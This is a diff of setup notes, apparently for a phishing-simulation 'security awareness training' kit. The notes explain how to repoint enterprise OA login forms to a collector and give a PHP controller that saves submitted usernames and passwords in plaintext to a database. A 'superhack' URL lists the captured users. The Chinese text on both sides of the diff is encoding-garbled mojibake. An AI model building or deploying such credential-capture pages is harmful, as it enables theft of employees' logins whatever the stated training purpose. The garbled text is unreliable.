@@ -1,28 +1,28 @@
-ĞŞ¸Äindex.htmlÖĞ
+ä¿®æ”¹index.htmlä¸­
 
 <form action="index.php/index/index/input" method="post">
 
 
-·ÃÎÊµÄÒ³ÃæÊÇ
+è®¿é—®çš„é¡µé¢æ˜¯
 
 
 http://127.0.0.1/mail/public/index.php
 
-ÊäÈëÓÃ»§ÃûºÍÃÜÂë
-Ìø×ªµÄÒ³ÃæÊÇ
+è¾“å…¥ç”¨æˆ·åå’Œå¯†ç 
+è·³è½¬çš„é¡µé¢æ˜¯
 
 
 
 http://127.0.0.1/mail/public/index.php/index/index/input
 
-»¶Ó­²Î¼Ó°²È«ÒâÊ¶ÅàÑµ¡£
+æ¬¢è¿å‚åŠ å®‰å…¨æ„è¯†åŸ¹è®­ã€‚
 
 
 http://127.0.0.1/mail/public/superhack/index/search?key=fcvxz657o54ewn123cvb432lg
 
-²é¿´ÖĞÕĞÓÃ»§
+æŸ¥çœ‹ä¸­æ‹›ç”¨æˆ·
 
-ĞèÒªĞŞ¸Äpublic/.htaccess
+éœ€è¦ä¿®æ”¹public/.htaccess
 
 <IfModule mod_rewrite.c>
   Options +FollowSymlinks -Multiviews
@@ -33,3 +33,31 @@ http://127.0.0.1/mail/public/superhack/index/search?key=fcvxz657o54ewn123cvb432l
   
   RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]
 </IfModule>
+
+
+
+
+é’ˆå¯¹ä¸åŒçš„ä¼ä¸šOAç«™ç‚¹
+ä¿®æ”¹ç™»å½•è·³è½¬ç«™ç‚¹
+  <form id="login_form" name="login_form" action="http://10.90.243.159/mail/public/index.php/index/index/input
+" method="post">
+
+
+C:\phpStudy\PHPTutorial\WWW\mail\application\index\controller\Index.php
+ä¿®æ”¹
+    public function input(Request $request)
+    {
+        $username = $request->param("mobileNumber");
+        $password = $request->param("password");
+        $data = ['username' => $username, 'password' => $password, 'time'=> date("Y-m-d H:i:s") ];
+        Db::name("sg")->insert($data);
+        return "æ¬¢è¿å‚åŠ å®‰å…¨æ„è¯†åŸ¹è®­ã€‚";
+    }
+    
+    
+    
+mobileNumberä¸ºå®é™…postæ•°æ®åŒ…å‚æ•°
+
+
+
+
